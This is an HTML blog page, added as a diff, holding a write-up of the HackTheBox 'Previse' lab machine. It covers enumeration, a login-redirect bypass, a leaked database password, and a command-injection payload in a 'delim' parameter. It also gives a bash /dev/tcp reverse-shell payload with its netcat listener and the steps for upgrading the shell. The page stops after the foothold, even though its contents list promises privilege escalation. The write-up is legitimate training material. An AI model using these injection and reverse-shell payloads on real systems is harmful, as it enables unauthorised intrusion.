@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="internet website">
+    
+    <link rel="shortcut icon" href="https://torrytw.ooo/favicon.ico">
+    
+    <link rel="stylesheet" href="/css/style.min.css">
+
+    <title>HTB - Previse | Writeup</title>
+</head>
+<body><header id="banner">
+    <h2><a href="https://torrytw.ooo">torry2</a></h2>
+    <nav>
+        <ul>
+            <li>
+                <a href="/index/" title="index">index</a>
+            </li><li>
+                <a href="/sort/" title="sort">sort</a>
+            </li><li>
+                <a href="/contact/" title="contact">contact</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main id="content">
+<article>
+    <header id="post-header">
+        <h1>HTB - Previse | Writeup</h1>
+        <div>
+                <time></time>
+            </div>
+    </header><p><img src="/static/htbprevise/info.png" alt="Box Info"></p>
+<aside id="toc">
+    <h4>Table of Contents</h4>
+	<h4><a href="#here">1. </a>Enumeration</h4>
+	<h4><a href="#here">2. </a>HTTP 1/2</h4>
+	<h4><a href="#here">3. </a>Null Session</h4>
+	<h4><a href="#here">4. </a>HTTP 2/2</h4>
+	<h4><a href="#here">5. </a>Command Injection</h4>
+	<h4><a href="#here">6. </a>Foothold</h4>
+	<h4><a href="#here">7. </a>Database + Hash Cracking</h4>
+	<h4><a href="#here">8. </a>user.txt</h4>
+	<h4><a href="#here">9. </a>Privilege Escalation</h4>
+	<h4><a href="#here">10. </a>root.txt</h4>
+</aside>
+<p>Setting Host:
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo <span class="nb">echo</span> <span class="s2">&#34;&lt;IP&gt; previse.htb&#34;</span> &gt;&gt; /etc/hosts</span></span></code></pre></div></p>
+<p>Setting Host:
+sudo echo &ldquo;<IP> previse.htb&rdquo; &raquo; /etc/hosts</p>
+<p>nmap -Pn -sV previse.htb &gt; scan.txt</p>
+<p>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>Since this is an easy box and the http server is showing content, it is safe to assume no further services have been missed in our scan.</p>
+<p>initiallook.png</p>
+<p>Navigating to the root / path of the page we are redirected to /login.php, with this information we can begin fuzzing for further directories whilst we explore the pages behaviour.</p>
+<p>dirbuster -H -l /directory-list-lowercase-2.3-medium.txt -g -e php -t 100 -u <a href="http://previse.htb">http://previse.htb</a> &gt; dirb.txt</p>
+<p>We find the following files that are of interest to us, however all these pages redirect back to the /login.php page from earlier
+File found: /index.php - 302
+File found: /download.php - 302
+File found: /status.php - 302
+File found: /files.php - 302
+File found: /accounts.php - 302
+File found: /file_logs.php - 302
+File found: /logout.php - 302
+File found: /login.php - 200
+File found: /config.php - 200</p>
+<p>behaviour:
+wrongpassword.png</p>
+<p>focusing on /accounts.php which is the assumption of the account creation page, we can analyse the request in burpsuite
+request.png</p>
+<p>intercepting the response shows us a logged in users page, including <title>Previse Create Account</title>  in the html
+we can modify the request from 302 FOUND to 200 OK
+responsehack.png</p>
+<p>this gives us a session on the page</p>
+<p>i created an account using the credentials torry:password
+intercepting the request once again i modifed the response to 200 OK and the account succesfully created!
+account.png</p>
+<p>loggin back in via login.php gives us full access to the site
+status.png
+files.png
+logs.txt</p>
+<p>on the files.php page we can see a file called SITEBACKUPZIP.zip uploaded by an admin &ldquo;m4lwhere&rdquo; (box creator)
+downloading this we retrieve the backend php code for the website and find some credentials in config.php for a mysql server which we can see is actively used in status.png</p>
+<?php
+
+function connectDB(){
+    $host = 'localhost';
+    $user = 'root';
+    $passwd = 'mySQL_p@ssw0rd!:)';
+    $db = 'previse';
+    $mycon = new mysqli($host, $user, $passwd, $db);
+    return $mycon;
+}
+
+?>
+<p>credential stuffing does not work with either root or the user m4lwhere on the page or via ssh as we previously saw running</p>
+<p>logs.txt.png
+the other submenu of the management meny alongisde status.php allows us to download a log file and specify a deliminator
+delim.png
+analysing the request in burpsuite we see the deliminator being passed as a parameter, alongide with how the log file looks again confirming the user m4lwhere
+forwarding the request downloads out.log as we see in the response</p>
+<p>returning back to the site backup file we found before, inspecting the logs.php we can spot the vulnerability.</p>
+<?php
+session_start();
+if (!isset($_SESSION['user'])) {
+    header('Location: login.php');
+    exit;
+}
+?>
+<?php
+if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
+    header('Location: login.php');
+    exit;
+}
+
+/////////////////////////////////////////////////////////////////////////////////////
+//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
+/////////////////////////////////////////////////////////////////////////////////////
+
+$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
+echo $output;
+
+$filepath = "/var/www/out.log";
+$filename = "out.log";
+
+if(file_exists($filepath)) {
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($filepath));
+    ob_clean(); // Discard data in the output buffer
+    flush(); // Flush system headers
+    readfile($filepath);
+    die();
+} else {
+    http_response_code(404);
+    die();
+}
+?> 
+<p>as the deliminator is passed through python, we can attempt command injection with the use of semi colons ontop of the deliminator paramter
+commandinj.txt</p>
+<p>to confirm the existence of command injection, i used the following payload to create a file on the server, assuming the working directory was www-data
+delim=space;touch+thisfileexists.txt;echo+&ldquo;i+exist&rdquo;+&raquo;+thisfileexists.txt</p>
+<p>confirmed.png</p>
+<p>this confirms command injection through the delim parameter.</p>
+<p>we can create a payload to get a reverse shell on the system with the help of payloadallthethings and a bit of url encoding:
+listener:
+nc -lvnp 9001</p>
+<p>delim=comma;bash+-c+&lsquo;sh+-i+&gt;%26+/dev/tcp/0.0.0.0/9001+0&gt;%261&rsquo;</p>
+<p>we recieve a connection back!</p>
+<p>listening on [any] 9001 &hellip;
+connect to [10.10.14.11] from (UNKNOWN) [10.10.11.104] 41578
+sh: 0: can&rsquo;t access tty; job control turned off
+$ whoami
+www-data</p>
+<p>exploring the sytem, we spot the user flag in the home directory of the user m4lwhere, however we do not have permissions to access it.
+to further explore the system i decided to spawn a stable tty shell with python on the machine</p>
+<p>we can confirm python3 exists with
+which python3
+/usr/bin/python3</p>
+<p>to spawn the shell:
+python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo;
+CTRL + Z
+stty raw -echo; fg
+enter
+export TERM=xterm-256color</p>
+</article>
+
+        </main><footer id="footer">
+    Copyright © 2022 torrytwooo
+</footer>
+</body>
+</html>
